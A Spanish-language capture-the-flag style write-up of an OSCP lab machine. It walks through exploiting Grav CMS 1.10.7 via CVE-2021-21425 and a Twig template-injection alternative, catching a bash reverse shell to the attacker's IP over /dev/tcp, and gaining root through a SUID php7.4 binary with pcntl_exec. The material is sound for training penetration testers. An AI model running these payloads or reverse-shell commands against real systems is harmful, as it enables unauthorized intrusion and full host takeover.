# Máquina "Astronaut" (Grav CMS) — Writeup detallado (OSCP / PG)

**Objetivo:** 192.168.241.12 — host `gravity`, Linux (Ubuntu + snaps)
**Atacante (Kali):** tun0 = 192.168.45.200

Resumen de la cadena:
**Web Grav CMS 1.10.7 en `/grav-admin/` → CVE-2021-21425 (Arbitrary YAML Write, sin autenticar) → RCE como www-data vía el scheduler de Grav → reverse shell → SUID `/usr/bin/php7.4` (GTFOBins `pcntl_exec`) → root.**

> Es una máquina "directa" en dos tiempos: una CVE de aplicación da el foothold y un SUID mal puesto da root. Lo valioso es el **método para localizar la ruta real de la app** y entender **cómo el exploit convierte un write de YAML en ejecución de comandos**.

---

## 0. Conceptos base

- **CVE-2021-21425 (Grav CMS ≤ 1.10.7):** el plugin Admin expone una tarea (`SaveDefault` / config del scheduler) que permite **escribir YAML arbitrario sin autenticación**, usando solo el `admin-nonce` que viene en el HTML del propio panel de login. Escribiendo en la config del **scheduler** se registra un "custom job" (un cron de Grav) con el comando que queramos → **RCE**.
- **Scheduler de Grav:** Grav tiene un cron propio que corre los "custom jobs" cada minuto (`* * * * *`). El job que inyectamos ejecuta `php -r eval(base64_decode(...))`, y ese PHP nos lanza el reverse shell. Por eso **no hay salida inline y hay ~1 min de retardo**: el comando no corre al enviar el POST, corre cuando el scheduler pasa.
- **SUID + `euid`:** un binario con el bit SUID de root corre con los privilegios del dueño. `/usr/bin/php7.4` con SUID permite, vía `pcntl_exec('/bin/sh', ['-p'])`, lanzar una shell que **mantiene el euid=0**. El `-p` es clave: evita que la shell suelte los privilegios.

---

## 1. Reconocimiento

```bash
# Puertos
sudo nmap -p- --min-rate=5000 -T4 -Pn 192.168.241.12
# Versiones + scripts por defecto
sudo nmap -p22,80 -sCV -T4 -Pn 192.168.241.12
```

Abiertos: **22 (SSH)** y **80 (HTTP)**.

### 1.1 El paso que desatasca TODO: encontrar la ruta real de la app

La web en `http://192.168.241.12/` no era la raíz de la aplicación. El dato decisivo salió del script `http-ls` de nmap (listado de directorios) y de `whatweb`:

```bash
nmap -p80 --script http-ls 192.168.241.12
whatweb http://192.168.241.12/
```
El listado mostraba un directorio **`grav-admin/`**. Es decir, Grav **no estaba en `/` sino en `/grav-admin/`**.

> **Lección #1 (la más importante de esta máquina):** antes de lanzar cualquier exploit contra una CMS, confirma **dónde vive la app**. Un exploit que apunta a `/` cuando la app está en `/grav-admin/` falla de formas confusas:
> - El PoC de CsEnox petaba con `findAll('input')[3] → IndexError` (no encontraba los campos del login porque pedía la página equivocada).
> - El de exploit-db (49973.py) petaba con `AttributeError: 'NoneType' object has no attribute 'group'` al buscar `admin-nonce` → **el regex no encontró el nonce porque la respuesta no era el panel de Grav**.
>
> Todos esos errores = "pedí la URL equivocada". La solución no es tocar el regex, es **corregir la URL base** a `http://192.168.241.12/grav-admin`.

---

## 2. Explotación: CVE-2021-21425 (exploit-db 49973.py)

```bash
searchsploit -m 49973.py     # GravCMS 1.10.7 - Arbitrary YAML Write (Unauthenticated) (2)
```

### 2.1 Entender qué hace el exploit (no copiar-pegar a ciegas)

El flujo del script:
1. `GET /grav-admin/admin` → extrae el `admin-nonce` del HTML (está ahí **sin autenticar**).
2. `POST /grav-admin/admin/config/scheduler` con `task=SaveDefault` → **escribe un custom job** en el scheduler cuyo comando es:
   ```
   /usr/bin/php -r eval(base64_decode("<payload_php_en_base64>"));
   ```
3. Ese PHP (ya decodificado) hace:
   ```php
   file_put_contents('/tmp/rev.sh', base64_decode('<reverse_shell_en_base64>'));
   chmod('/tmp/rev.sh', 0755);
   system('bash /tmp/rev.sh');
   ```
   → escribe el reverse shell en `/tmp/rev.sh` y lo ejecuta.

### 2.2 Dos cosas que hay que editar en el script

```python
target = "http://192.168.241.12/grav-admin"   # (1) la ruta REAL, sin barra final
```
```bash
# (2) regenerar el base64 del reverse shell con TU IP y TU puerto
echo -ne "bash -i >& /dev/tcp/192.168.45.200/4444 0>&1" | base64 -w0
# pegar el resultado dentro de base64_decode('...') del payload PHP
```

> **Truco para no equivocarte de puerto:** verifica qué reverse shell lleva el script realmente, decodificándolo:
> ```bash
> grep -o "base64_decode('[^']*'" 49973.py | cut -d"'" -f2 | base64 -d
> # debe imprimir: bash -i >& /dev/tcp/192.168.45.200/4444 0>&1
> ```

### 2.3 Lanzar

```bash
nc -lvnp 4444        # terminal 1 (listener)
python3 49973.py     # terminal 2 (dispara el exploit)
```

Si el script termina **sin error**, el nonce se leyó bien y el job quedó registrado. **Espera 1-2 minutos** (el scheduler corre el cron cada minuto). El shell cae solo:

```
connect to [192.168.45.200] from (UNKNOWN) [192.168.241.12] 53868
www-data@gravity:~/html/grav-admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Nota: `bash: cannot set terminal process group ... no job control in this shell` es normal en un reverse shell básico. Si molesta, se estabiliza con el truco de `python3 -c 'import pty;pty.spawn("/bin/bash")'` + `stty raw -echo`.

### 2.4 Alternativa más limpia: Twig SSTI (sin script, con salida visible)

Grav renderiza páginas con **Twig** si lo activas en el front matter. Si tienes acceso al editor de páginas del admin, creas una página con:
```
---
title: x
cache_enable: false
process:
    twig: true
---
{{ ['id']|map('system')|join('\n') }}
```
Al **visitar la página** ves la salida del comando en el navegador (sin retardo de cron, sin parsear nonce). Para el shell:
```
{{ ['bash -c "bash -i >& /dev/tcp/192.168.45.200/4444 0>&1"']|map('system')|join }}
```
Las dos vías llegan al mismo sitio; el SSTI es más cómodo para depurar porque **ves el output**.

---

## 3. Escalada a root: SUID php7.4

### 3.1 Enumerar binarios SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```
Entre los normales del sistema aparece el que no debería estar:
```
/usr/bin/php7.4
```

> **Cómo se detecta que esto es el camino:** `/usr/bin/php7.4` **no es SUID por defecto** en ninguna instalación limpia. Cuando ves un intérprete (php, python, perl, ruby, bash...) con SUID en la lista, salta directo a **GTFOBins** y busca ese binario con el filtro **SUID**. GTFOBins te da el one-liner exacto.

### 3.2 Explotar (GTFOBins: php → SUID)

```bash
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
id
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
cat /root/proof.txt
# 9b677fdb26d9e964c882c00e4865c348
```

`pcntl_exec('/bin/sh', ['-p'])` reemplaza el proceso PHP por `/bin/sh` conservando el **euid=0** gracias al SUID. El `-p` impide que sh baje privilegios. `euid=0` = root efectivo: lees `/root`.

---

## 4. Chuleta rápida

```bash
# 1. Recon: ENCUENTRA LA RUTA DE LA APP
sudo nmap -p- --min-rate=5000 -Pn 192.168.241.12
nmap -p80 --script http-ls 192.168.241.12        # -> revela /grav-admin/
whatweb http://192.168.241.12/grav-admin/         # -> Grav 1.10.7

# 2. Exploit CVE-2021-21425
searchsploit -m 49973.py
#  editar: target="http://192.168.241.12/grav-admin"
#  regenerar base64 del rev shell con tu IP/puerto 4444
grep -o "base64_decode('[^']*'" 49973.py | cut -d"'" -f2 | base64 -d   # verificar
nc -lvnp 4444
python3 49973.py                                  # esperar 1-2 min (scheduler cron)

# 3. Privesc SUID php7.4
find / -perm -4000 -type f 2>/dev/null            # -> /usr/bin/php7.4
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
id ; cat /root/proof.txt
```

---

## 5. Lecciones clave

1. **Localiza la app ANTES de explotar.** `http-ls`, `whatweb`, `gobuster`/`feroxbuster`. Grav estaba en `/grav-admin/`; apuntar a `/` provocaba `IndexError` y `NoneType ... group` — errores que gritan "URL equivocada", no "exploit roto".
2. **Lee lo que hace el exploit.** El 49973.py no ejecuta tu comando al instante: **escribe un cron en el scheduler de Grav**. Entender eso explica el retardo de ~1 min y la ausencia de salida inline, y evita que lo des por fallido demasiado pronto.
3. **Verifica tu payload objetivamente.** Decodifica el base64 que vas a enviar (`base64 -d`) para confirmar IP y puerto. Un `444` en vez de `4444` te deja esperando un shell que nunca llega.
4. **El puerto del listener debe coincidir con el del payload.** Y si el shell no cae con `4444`, prueba `443`/`80` (egress saliente filtrado es común).
5. **Intérprete con SUID = GTFOBins al instante.** php, python, perl, bash, etc. con bit SUID → one-liner de escalada. `pcntl_exec('/bin/sh', ['-p'])`; el `-p` conserva el euid=0.
6. **`euid=0` ya es root efectivo**, aunque `uid` siga siendo 33: lees `/root/proof.txt` igual.
7. **Twig SSTI en Grav** es la vía manual más cómoda cuando quieres ver la salida de los comandos en el navegador (`process: twig: true` + `{{ ['cmd']|map('system') }}`).
```
